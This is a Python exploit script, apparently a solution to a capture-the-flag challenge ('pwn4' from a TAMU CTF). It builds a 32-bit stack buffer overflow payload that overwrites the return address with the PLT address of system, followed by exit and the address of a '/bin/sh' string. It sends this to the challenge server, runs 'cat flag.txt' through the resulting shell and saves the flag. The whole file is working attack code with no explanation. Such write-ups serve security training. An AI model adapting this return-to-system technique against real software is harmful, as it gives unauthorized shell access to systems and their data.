# https://ctftime.org/task/5398
from pwn import *
from zio import *
import re

flag_pattern = r"gigem{.+?}"

off_s = -0x1c
off_ret = 4
junk = 'a'

e = ELF("./pwn4")
plt_system = e.plt['system']
plt_exit = e.plt['exit']
str_addr_bin_sh = e.symbols['secret']
payload = (off_ret - off_s) * junk + l32(plt_system) + l32(plt_exit) + l32(str_addr_bin_sh)

server = "pwn.ctf.tamu.edu", 4324
io = zio(server, print_read=False, print_write=False)
io.writeline(payload)
io.writeline('cat flag.txt')
content = io.read_until_re(flag_pattern)
flag = re.search(flag_pattern, content).group()

with open('flag', 'wb') as f:
	f.write(flag)
